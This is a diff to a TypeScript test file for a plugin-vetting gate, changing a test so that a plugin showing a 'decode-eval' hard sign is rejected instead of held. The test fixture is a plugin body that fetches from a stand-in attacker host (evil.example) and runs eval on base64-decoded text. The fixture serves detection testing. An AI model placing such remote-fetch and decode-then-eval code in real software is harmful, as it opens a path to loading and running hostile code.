@@ -35,12 +35,12 @@ function plugin(name: string, body: string): string {
   return dir;
 }
 
-describe("stage 2.1: check results are stored and shown, nothing is held on them", () => {
-  it("a held version gets its findings and capabilities; the decision stays 'wait'", async () => {
+describe("check results are stored, linked to the hook's hash and shown", () => {
+  it("a version with a hard sign is rejected, and its findings and capabilities are stored", async () => {
     const { store, gate, checked } = setup();
     const dir = plugin("p1", "const r = await fetch('https://evil.example/x');\neval(atob('MQ=='));\n");
     const d = await gate.decide(ctx(dir, "sha256:p1"));
-    expect(d.action).toBe("wait"); // held exactly as before, not rejected, even with a block finding
+    expect(d.action).toBe("reject"); // decode→eval is a hard sign (spec §5.3: block)
     await gate.checksIdle();
     const stored = store.getCheck("sha256:p1")!;
     expect(stored.result.findings.map((f) => f.rule)).toContain("decode-eval");
@@ -49,7 +49,7 @@ describe("stage 2.1: check results are stored and shown, nothing is held on them
     expect(store.listLog(5).some((l) => l.kind === "check")).toBe(true);
   });
 
-  it("a clean plugin is still held (2.1 changes no decision)", async () => {
+  it("a clean plugin that is not one of our snapshots (external / direct install) is still held", async () => {
     const { gate, store } = setup();
     const d = await gate.decide(ctx(plugin("p2", "export default 1;\n"), "sha256:p2"));
     expect(d.action).toBe("wait");
